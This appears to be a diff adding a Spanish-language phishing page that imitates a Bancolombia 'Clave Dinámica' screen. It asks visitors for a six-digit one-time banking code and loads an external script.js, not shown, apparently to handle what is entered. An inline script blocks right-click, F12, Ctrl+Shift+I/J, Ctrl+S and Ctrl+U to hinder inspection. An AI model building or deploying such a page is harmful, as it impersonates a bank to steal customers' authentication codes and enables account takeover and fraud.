@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autenticación - Clave Dinámica</title>
+    
+    <style>
+        :root {
+            --color-background-main: #000000; 
+            --color-box-bg: #2B2828;         /* Fondo de la caja: #2B2828 */
+            --color-box-shadow: rgba(0, 0, 0, 0.5);
+            --color-text-title: #ffffff;       
+            --color-text-dark: #ffffff;        
+            --color-button-disabled: #616161; 
+            --color-button-active: #f7d242;    
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: var(--color-background-main);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center; 
+            min-height: 100vh;
+            overflow: hidden;
+            
+            /* --- FONDO DE IMAGEN --- */
+            background-image: url('backgr.jpg'); /* Asegúrate que la ruta sea correcta */
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative; /* Contenedor principal para posicionar el logo */
+        }
+        
+        /* --- NUEVOS ESTILOS PARA EL LOGO --- */
+        .logo-container {
+            position: absolute; 
+            top: -70px; /* Ajusta para colocarlo más arriba o más abajo */
+            z-index: 10; 
+            text-align: center;
+        }
+        .logo-container img {
+            max-width: 200px; /* Tamaño del logo */
+            height: auto;
+            border-radius: 50%;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .loading-box {
+            background-color: var(--color-box-bg); 
+            padding: 40px;
+            padding-top: 80px; /* IMPORTANTE: Da espacio al logo para que no choque con el contenido */
+            border-radius: 8px;
+            box-shadow: 0 4px 15px var(--color-box-shadow);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        /* --- Títulos y Párrafos --- */
+        .loading-box h2 { font-size: 1.5rem; color: var(--color-text-title); margin-bottom: 5px; font-weight: bold; }
+        .message { font-size: 1rem; color: var(--color-text-dark); margin-bottom: 25px; }
+        .small-text { font-size: 0.85rem; color: var(--color-text-dark); line-height: 1.4; margin-top: 30px; }
+
+        /* --- Campos de Clave Dinámica (Los 6 cuadros) --- */
+        .input-group-clave { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .clave-input {
+            width: 30px; height: 40px; text-align: center; font-size: 1.5rem;
+            background-color: transparent; border: 1px solid #777777; border-radius: 4px;
+            outline: none; color: #ffffff; 
+        }
+        .clave-input::-webkit-outer-spin-button, .clave-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .clave-input { -moz-appearance: textfield; }
+
+        /* --- Botón Confirmar y Estados --- */
+        .btn-confirmar { width: 100%; padding: 14px; border: none; border-radius: 4px; font-size: 1rem; font-weight: bold; margin-top: 25px; transition: background-color 0.3s; }
+        .btn-disabled { background-color: var(--color-button-disabled); cursor: not-allowed; color: #ffffff; }
+        .btn-active { background-color: var(--color-button-active); color: #333333; cursor: pointer; }
+        .btn-active:hover { background-color: #ffc107; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <div class="logo-container">
+            <img src="loguito.png" alt="Logo de la Empresa">
+        </div>
+        <div class="loading-box">
+            <h2>Autenticación</h2>
+            <p class="message">Ingresa tu Clave Dinámica</p>
+            
+            <form id="claveForm">
+                <div class="input-group-clave">
+                    <input type="number" id="c1" class="clave-input" maxlength="1" required>
+                    <input type="number" id="c2" class="clave-input" maxlength="1" required>
+                    <input type="number" id="c3" class="clave-input" maxlength="1" required>
+                    <input type="number" id="c4" class="clave-input" maxlength="1" required>
+                    <input type="number" id="c5" class="clave-input" maxlength="1" required>
+                    <input type="number" id="c6" class="clave-input" maxlength="1" required>
+                </div>
+                
+                <p class="small-text">Consulta tu Clave Dinámica desde la App Mi Bancolombia del dispositivo móvil donde estás inscrito al servicio.</p>
+
+                <button type="submit" id="btnConfirmar" class="btn-confirmar btn-disabled" disabled>Confirmar</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+<script>
+  // Bloquear clic derecho (botón derecho del mouse)
+  document.addEventListener("contextmenu", function(e) {
+    e.preventDefault();
+  });
+
+  // Bloquear combinaciones de teclas peligrosas
+  document.onkeydown = function(e) {
+    const key = e.keyCode || e.which;
+
+    if (
+      key === 123 || // F12
+      (e.ctrlKey && e.shiftKey && key === 73) || // Ctrl+Shift+I
+      (e.ctrlKey && e.shiftKey && key === 74) || // Ctrl+Shift+J
+      (e.ctrlKey && key === 83) || // Ctrl+S
+      (e.ctrlKey && key === 85) // Ctrl+U
+    ) {
+      e.preventDefault();
+      return false;
+    }
+  };
+</script>
+</body>
+</html>
